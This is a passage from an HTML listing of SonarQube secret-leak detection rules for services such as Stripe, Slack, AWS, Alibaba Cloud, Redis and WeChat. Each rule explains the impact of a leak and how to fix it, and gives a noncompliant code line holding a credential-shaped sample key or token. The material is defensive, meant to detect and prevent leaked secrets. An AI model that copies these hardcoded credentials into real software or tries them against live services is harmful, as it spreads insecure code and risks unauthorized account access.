  <li> SendGrid Documentation - <a href="https://docs.sendgrid.com/ui/account-and-settings/api-keys">API Keys</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6732">
              secrets:S6732
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Breach of trust in non-repudiation and disruption of the audit trail</h4>
<p>When such a secret is compromised, malicious actors might have the possibility to send malicious event objects, causing discrepancies in the audit
trail. This can make it difficult to trace and verify the sequence of events, impacting the ability to investigate and identify unauthorized or
fraudulent activity.</p>
<p>All in all, this can lead to problems in proving the validity of transactions or actions performed, potentially leading to disputes and legal
complications.</p>
<h4>Financial loss</h4>
<p>Since this secret is used to process transaction-related operations, financial loss may also occur if transaction-related objects are corrupted or
the account is tampered with.<br> This can range from indirect losses to direct unauthorized transfers of funds that can lead to bankruptcy or
impoverishment of individuals.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("stripe_key", "sk_live_kiSSAXe2IyGNvprHode7efRT") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("stripe_key", System.getenv("STRIPE_KEY"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6699">
              secrets:S6699
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>The Spotify API secret is a confidential key used for authentication and authorization purposes when accessing the Spotify API.</p>
<p>The Spotify API grants applications access to Spotify’s services and, by extension, user data. Should this secret fall into the wrong hands, two
immediate concerns arise: unauthorized access to user data and data manipulation.</p>
<p>When unauthorized entities obtain the API secret, they have potential access to users' personal Spotify information. This includes the details of
their playlists, saved tracks, and listening history. Such exposure might not only breach personal boundaries but also infringe upon privacy standards
set by platforms and regulators.</p>
<p>In addition to simply gaining access, there is the risk of data manipulation. If malicious individuals obtain the secret, they could tamper with
user content on Spotify. This includes modifying playlists, deleting beloved tracks, or even adding unsolicited ones. Such actions not only disrupt
the user experience but also violate the trust that users have in both Spotify and third-party applications connected to it.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("spotify_secret", "f3fbd32510154334aaf0394aca3ac4c3") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("spotify_secret", System.getenv("SPOTIFY_SECRET"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6336">
              secrets:S6336
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<p>This rule flags instances of:</p>
<ul>
  <li> Alibaba Cloud AccessKey ID </li>
  <li> Alibaba Cloud AccessKey secret </li>
</ul>
<h3>What is the potential impact?</h3>
<p>AccessKeys are long term credentials designed to authenticate and authorize requests to Alibaba Cloud.</p>
<p>If your application interacts with Alibaba Cloud then it requires AccessKeys to access all the resources it needs to function properly. Resources
that can be accessed depend on the permissions granted to the Alibaba Cloud account.<br> These credentials may authenticate to the account root user
who has unrestricted access to all resources in your Alibaba Cloud account, including billing information.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Financial loss</h4>
<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of
client applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own
need, including in a way that was not expected.</p>
<p>This additional use of the secret will lead to added costs with the service provider.</p>
<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected
application. This might result in a partial denial of service for all the application’s users.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h2>How to fix it</h2>
<p>Only administrators should have access to the AccessKeys used by your application.</p>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("alibaba-key", "LTAI5tBcc9SecYAo") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("alibaba-key", System.getenv("ALIBABA_KEY"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6731">
              secrets:S6731
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Slack bot tokens have multiple types of access to a channel: They can post messages, read usernames and users emails. These links have plethora of
possible capabilities.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this token to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h4>Compromise of sensitive personal data</h4>
<p>This kind of service is often used to exchange information that could include personal information, chat logs, and other private data that users
have shared on the platform. This is called <a href="https://gdpr.eu/eu-gdpr-personal-data/"><code>Personally Identifiable Information</code></a>.<br>
The leaked app key could provide a gateway for unauthorized individuals to access and misuse this data, compromising the privacy and safety of the
application users.</p>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If this kind of sensitive personal data
gets leaked, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("slack_bot_token", "xoxb-592666205443-2542034435697-FM7vdsq184d0G5vBNiOq8MSF8t7") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("slack_bot_token", System.getenv("SLACK_BOT_TOKEN"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6739">
              secrets:S6739
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the credentials.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("redis-url", "rediss://admin:password@example.com:8080/example") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("redis-url", System.getenv("REDIS_URL"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6290">
              secrets:S6290
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<p>This rule detects the following leaks:</p>
<ul>
  <li> AWS Secret Access Keys </li>
  <li> AWS Access IDs </li>
  <li> AWS Session Tokens </li>
</ul>
<h3>What is the potential impact?</h3>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this secret to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h4>Financial loss</h4>
<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of
client applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own
need, including in a way that was not expected.</p>
<p>This additional use of the secret will lead to added costs with the service provider.</p>
<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected
application. This might result in a partial denial of service for all the application’s users.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("aws-secret-access-key", "kHeUAwnSUizTWpSbyGAz4f+As5LshPIjvtpswqGb") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("aws-secret-access-key", System.getenv("AWS_SECRET_ACCESS_KEY"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6692">
              secrets:S6692
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>A reCaptcha secret key is a unique token that is used to verify the authenticity of reCaptcha requests made from an application to the reCaptcha
service. It is a key component in ensuring CAPTCHAs challenges issued by the application are properly solved and verified.</p>
<p>If a reCaptcha secret key leaks to an unintended audience, attackers with access to it will be able to forge CAPTCHA responses without solving
them. It will allow them to bypass the CAPTCHA challenge verification.</p>
<p>This can lead to an influx of spam submissions, automated attacks, or unauthorized access attempts depending on the feature the CAPTCHA mechanism
is intended to protect.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("recaptcha_secret", "6LcaQa4mAAAAAFvhmzAd2hErGBSt4FC-BPzm4cNS") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("recaptcha_secret", System.getenv("RECAPTCHA_SECRET"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
<h3>Documentation</h3>
<ul>
  <li> Google reCAPTCHA Documentation - <a href="https://developers.google.com/recaptcha/intro">Developer’s Guide</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6695">
              secrets:S6695
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>WeChat application keys are used for authentication and authorization purposes when integrating third-party applications with the WeChat
platform.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Compromise of sensitive personal data</h4>
<p>This kind of service is often used to exchange information that could include personal information, chat logs, and other private data that users
have shared on the platform. This is called <a href="https://gdpr.eu/eu-gdpr-personal-data/"><code>Personally Identifiable Information</code></a>.<br>
The leaked app key could provide a gateway for unauthorized individuals to access and misuse this data, compromising the privacy and safety of the
application users.</p>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If this kind of sensitive personal data
gets leaked, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this secret to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h4>WeChat exploitation</h4>
<p>Furthermore, the leaked app key could enable unauthorized parties to manipulate or disrupt the functionality of the WeChat app. They could tamper
with app settings, inject malicious code, or even take control of the app’s user base. Such actions could result in a loss of user trust, service
disruptions, and reputational damage for both the app developer and the WeChat platform.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set("secret_key", "40b6b70508b47cbfb4ee39feb617a05a") // Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set("secret_key", System.getenv("SECRET_KEY"))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6292">
              secrets:S6292
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>If your application interacts with Amazon MWS then it requires credentials to access all the resources it needs to function properly.<br> The
credentials authenticate to a seller account which can have access to resources like products, orders, price or shipment information.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Financial loss</h4>
<p>Since this secret is used to process transaction-related operations, financial loss may also occur if transaction-related objects are corrupted or
the account is tampered with.<br> This can range from indirect losses to direct unauthorized transfers of funds that can lead to bankruptcy or
impoverishment of individuals.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this secret to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h4>Account termination</h4>
<p>Unauthorized access to mailing service API keys can also result in resource abuse. Attackers can exploit the API keys to send a large volume of
spam emails or perform other resource-intensive operations, causing a significant strain on the mailing service provider’s infrastructure.</p>
<p>The service provider, being vigilant about such activities, may flag your account and take action against it. This could lead to the suspension or
termination of the compromised account, thus causing significant inconvenience and potential loss of communication with your customers or
partners.</p>
<h2>How to fix it</h2>
<p>Only administrators should have access to the MWS credentials used by your application.</p>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
